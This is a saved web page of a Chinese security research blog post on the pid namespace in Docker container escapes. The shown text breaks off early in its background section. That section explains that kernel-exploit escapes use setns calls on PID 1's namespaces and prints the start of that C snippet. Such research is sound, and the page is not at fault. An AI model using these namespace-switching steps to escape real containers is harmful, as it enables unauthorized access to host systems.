<!DOCTYPE html>
<!-- saved from url=(0053)https://tiangonglab.github.io/blog/tiangongarticle030 -->
<html lang="zh-Hans" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated="true" data-theme="light" data-rh="lang,dir,data-has-hydrated,class"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link id="giscus-css" rel="stylesheet" href="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/default.css">

<meta name="generator" content="Docusaurus v3.3.2">
<title>Docker 逃逸中被忽略的 pid namespace | 破壳漏洞挖掘平台</title><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://poc.qianxin.com/img/poc-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://poc.qianxin.com/img/poc-social-card.jpg"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><link data-rh="true" rel="icon" href="https://tiangonglab.github.io/img/favicon.ico"><link rel="alternate" type="application/rss+xml" href="https://tiangonglab.github.io/blog/rss.xml" title="破壳漏洞挖掘平台 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="https://tiangonglab.github.io/blog/atom.xml" title="破壳漏洞挖掘平台 Atom Feed">



<link rel="search" type="application/opensearchdescription+xml" title="破壳漏洞挖掘平台" href="https://tiangonglab.github.io/opensearch.xml">
<script src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/k257lj4y58"></script>
<script src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/hm.js" async=""></script><link rel="stylesheet" href="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/styles.ea4957cd.css">
<script src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/runtime~main.a93c567c.js" defer="defer"></script>
<script src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/main.41aca788.js" defer="defer"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0" data-rh="true"><link rel="preconnect" href="https://m80rff4t9f-dsn.algolia.net/" crossorigin="anonymous" data-rh="true"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a6aa9e1f.f8697713.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/da551ade.f5e0d133.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/5339fec1.5e8db936.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/86d4ffde.2a72789f.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/fc183fd4.cb818371.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/4b34a114.5f2d5e9e.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/2db40e13.6e51d7e2.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/c7e1df22.555e5119.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/47802439.f4fb4328.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ae0d251d.9fc20634.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/e0e7269b.7909ca55.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/53a3e6dc.8d94a9c8.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/5454528b.d84a678e.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/50ca8917.33d74ae5.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a712eaa0.7607b0f6.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/41acc3c0.2b157212.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/43c74a26.f3e3a908.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/5e95c892.b34b33c4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/aba21aa0.35ef5c63.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a7bd4aaa.65207717.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/7c110bd0.c8ef2984.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a94703ab.b82832a9.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/5e95c892.b34b33c4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/aba21aa0.35ef5c63.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a7bd4aaa.65207717.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/7c110bd0.c8ef2984.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a94703ab.b82832a9.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/5e95c892.b34b33c4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/aba21aa0.35ef5c63.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a7bd4aaa.65207717.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/7c110bd0.c8ef2984.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a94703ab.b82832a9.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/17896441.6ef800b5.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/8070e160.13553440.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acebbbe7.ddf54b8a.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/80a5bcdb.d8af3a0a.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/7ecec2bf.54b585d0.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/4ada81ad.d1377efd.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/4c2498b6.7607d6ec.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/01a85c17.d5878690.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/41756ce8.d292f4f6.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/c8957c17.f769e696.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/cd72d84d.f7cd1ab3.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/3c1ff4ae.ed8cda92.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/7f1f9909.1ff01b19.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ccc49370.0d3f4cde.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/acecf23e.c0aa4bfe.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/551c06ba.336ef7d0.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/9e4087bc.8d3caab0.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/25003e4f.d5eb2b4a.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/c4f5d8e4.7a48ec71.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a7456010.8f203df4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/5e95c892.b34b33c4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/aba21aa0.35ef5c63.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a7bd4aaa.65207717.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/7c110bd0.c8ef2984.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a94703ab.b82832a9.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/5e95c892.b34b33c4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/aba21aa0.35ef5c63.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a7bd4aaa.65207717.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/7c110bd0.c8ef2984.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a94703ab.b82832a9.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/5e95c892.b34b33c4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/aba21aa0.35ef5c63.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a7bd4aaa.65207717.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/7c110bd0.c8ef2984.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/a94703ab.b82832a9.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/17896441.6ef800b5.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/9bbeba07.705c59d6.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/6875c492.5289a7d2.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/da551ade.f5e0d133.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/16c1eac1.4b76a9b7.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/6875c492.5289a7d2.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/36994c47.0994aba1.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/814f3328.8de1d6b4.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/da551ade.f5e0d133.js"><link rel="prefetch" href="https://tiangonglab.github.io/assets/js/ca7db861.8e66e405.js"><link rel="canonical" href="https://poc.qianxin.com/blog/tiangongarticle030" data-rh="true"><link rel="alternate" href="https://poc.qianxin.com/blog/tiangongarticle030" hreflang="zh-Hans" data-rh="true"><link rel="alternate" href="https://poc.qianxin.com/blog/tiangongarticle030" hreflang="x-default" data-rh="true"><meta property="og:url" content="https://poc.qianxin.com/blog/tiangongarticle030" data-rh="true"><meta name="docusaurus_tag" content="default" data-rh="true"><meta name="docsearch:docusaurus_tag" content="default" data-rh="true"><meta property="og:title" content="Docker 逃逸中被忽略的 pid namespace | 破壳漏洞挖掘平台" data-rh="true"><meta name="description" content="一、背景" data-rh="true"><meta property="og:description" content="一、背景" data-rh="true"><meta property="og:type" content="article" data-rh="true"><meta property="article:published_time" content="2024-05-15T00:00:00.000Z" data-rh="true"><meta property="article:tag" content="Docker,namespace" data-rh="true"></head>
<body class="" data-rh="class" style="overflow: visible;">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="https://tiangonglab.github.io/blog/tiangongarticle030#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a href="https://poc.qianxin.com/" target="_blank" rel="noopener noreferrer" class="navbar__brand"><div class="navbar__logo"><img src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/logo.svg" alt="破壳文档" class="nav-logo-class themedComponent_mlkZ themedComponent--light_NVdE" height="20" width="100"></div><b class="navbar__title text--truncate"></b></a><a class="navbar__item navbar__link tutorialClass" href="https://tiangonglab.github.io/docs/">文档</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="https://tiangonglab.github.io/blog">博客</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="https://tiangonglab.github.io/blog/tags">标签</a><a class="navbar__item navbar__link" href="https://tiangonglab.github.io/blog/archive">归档</a><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"><kbd class="DocSearch-Button-Key DocSearch-Button-Key--pressed">⌘</kbd><kbd class="DocSearch-Button-Key">K</kbd></span></button></div><a href="https://poc.qianxin.com/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">破壳官网<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP" type="button" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_re4s thin-scrollbar" aria-label="最近博文导航"><div class="sidebarItemTitle_pO2u margin-bottom--md">所有文章</div><ul class="sidebarItemList_Yudw clean-list"><li class="sidebarItem__DBe"><a aria-current="page" class="sidebarItemLink_mo7H sidebarItemLinkActive_I1ZP" href="https://tiangonglab.github.io/blog/tiangongarticle030">Docker 逃逸中被忽略的 pid namespace</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle029">关于 C++ 迭代器失效特性的研究</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle028">SystemUI As EvilPiP: 针对现代移动设备的劫持攻击</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle027">Palo Alto CVE-2024-3400 漏洞分析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle026">MikroTik RouterOS CVE-2023-32154 认证前RCE漏洞分析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle025">JSON 解析不一致性漏洞探究</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle024">IoT 设备常见 Web Server 漏洞挖掘思路分析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle023">探索 DBus 跨进程消息传递中的安全风险</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle022">Windows hypervisor&amp;内核调试的几种常见/不常见方法</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle021">FortiGate SSLVPN CVE-2024-21762漏洞利用分析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle020">Ghidra脚本编写：从IR到反编译C</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle019">关于Linux内核条件竞争的探讨</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle018">WebAssembly安全研究总结</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle017">Terrapin 攻击分析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle016">常见 PHP 源码保护与还原</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle015">Server as Client 漏洞模型</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle014">破壳分析：Linksys设备多个0-day漏洞</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle013">ESXi SLP漏洞复现</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle012">从传统到 AI 探讨 Webshell 检测攻防对抗</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle011">人与代码的桥梁-聊聊SAST</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle010">BMC 漏洞实例分析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle009">CodeDom 漏洞模式与 SharePoint RCE</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle008">Datacon 2023 漏洞分析赛道赛题二官方题解</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle007">IoT 设备中的认证绕过漏洞分析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle006">Exchange Server(CVE-2023-36439)远程代码执行漏洞分析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle005">WAF防护绕过技巧分析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle004">伪随机数问题浅析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle003">Windows内核竞态条件漏洞研究</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle002">Microsoft Hyper-V 虚拟 TPM 设备漏洞分析</a></li><li class="sidebarItem__DBe"><a class="sidebarItemLink_mo7H" href="https://tiangonglab.github.io/blog/tiangongarticle001">CVE-2023-0179 Linux内核提权</a></li></ul></nav></aside><main class="col col--7"><article class=""><header><h1 class="title_f1Hy">Docker 逃逸中被忽略的 pid namespace</h1><div class="container_mt6G margin-vert--md"><time datetime="2024-05-15T00:00:00.000Z">2024年5月15日</time> · 阅读需 30 分钟</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><img class="avatar__photo" src="./Docker 逃逸中被忽略的 pid namespace _ 破壳漏洞挖掘平台_files/clingcling.png" alt="clingcling"><div class="avatar__intro"><div class="avatar__name"><span>clingcling</span></div><small class="avatar__subtitle">天工实验室安全研究员,专注于Linux内核漏洞挖掘与利用</small></div></div></div></div></header><div id="__blog-post-container" class="markdown"><h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="一背景">一、背景<a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E4%B8%80%E8%83%8C%E6%99%AF" class="hash-link" aria-label="一、背景的直接链接" title="一、背景的直接链接">​</a></h2>
<p>最近在研究基于内核漏洞进行Docker逃逸的原理，发现漏洞利用中都会使用如下三行代码，用于切换Docker中exp进程的三种namespace：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token function" style="color: rgb(215, 58, 73);">setns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token function" style="color: rgb(215, 58, 73);">open</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"/proc/1/ns/mnt"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">O_RDONLY</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">setns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token function" style="color: rgb(215, 58, 73);">open</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"/proc/1/ns/pid"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">O_RDONLY</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token number" 